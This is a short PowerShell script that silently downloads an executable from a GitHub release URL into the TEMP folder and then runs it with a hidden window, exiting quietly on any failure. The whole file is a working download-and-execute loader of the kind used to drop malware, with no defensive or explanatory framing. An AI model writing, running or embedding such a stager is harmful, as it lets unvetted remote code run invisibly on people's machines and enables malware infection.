param (
    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/release.exe',
    [string]$OutputPath = "$env:TEMP\release.exe"
)

# Download using curl.exe silently
try {
    $curlArgs = @("-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"")
    Start-Process -FilePath "curl.exe" -ArgumentList $curlArgs -Wait -NoNewWindow
} catch {
    exit 1
}

# Run the executable silently
if (-Not (Test-Path $OutputPath)) { exit 1 }
try {
    Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
} catch {
    exit 1
}
